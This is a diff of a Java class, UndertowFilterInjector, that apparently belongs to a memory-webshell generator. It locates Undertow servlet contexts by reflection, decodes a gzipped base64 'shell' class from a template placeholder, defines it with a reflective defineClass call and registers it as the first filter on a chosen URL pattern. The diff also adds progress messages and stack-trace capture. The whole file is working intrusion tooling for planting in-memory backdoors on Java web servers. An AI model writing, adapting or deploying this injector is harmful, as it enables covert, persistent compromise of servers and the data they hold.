@@ -4,6 +4,7 @@ import javax.servlet.DispatcherType;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
@@ -14,37 +15,66 @@ import java.util.zip.GZIPInputStream;
 
 
 /**
- * @author ReaJason
  */
 public class UndertowFilterInjector {
-    private static String urlPattern;
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public UndertowFilterInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     @SuppressWarnings("Duplicates")
@@ -77,15 +107,16 @@ public class UndertowFilterInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -95,12 +126,12 @@ public class UndertowFilterInjector {
         }
         Class<?> filterInfoClass = context.getClass().getClassLoader().loadClass("io.undertow.servlet.api.FilterInfo");
         Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-        Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(shellClassName, filter.getClass());
+        Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(getClassName(), filter.getClass());
         invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
         Object deploymentImpl = getFieldValue(context, "deployment");
         Object managedFilters = invokeMethod(deploymentImpl, "getFilters", null, null);
         invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-        invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, shellClassName, urlPattern, DispatcherType.REQUEST});
+        invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, getClassName(), getUrlPattern(), DispatcherType.REQUEST});
         // invalidate cache
         invokeMethod(invokeMethod(deploymentImpl, "getServletPaths", null, null), "invalidate", null, null);
     }
@@ -112,13 +143,18 @@ public class UndertowFilterInjector {
             for (Map.Entry<String, Object> filter : filters.entrySet()) {
                 Class<?> filterClass = (Class<?>) getFieldValue(filter.getValue(), "filterClass");
                 if (filterClass != null) {
-                    if (filterClass.getName().equals(shellClassName)) {
+                    if (filterClass.getName().equals(getClassName())) {
                         return true;
                     }
                 }
             }
         }
         return false;
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -203,4 +239,18 @@ public class UndertowFilterInjector {
         return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
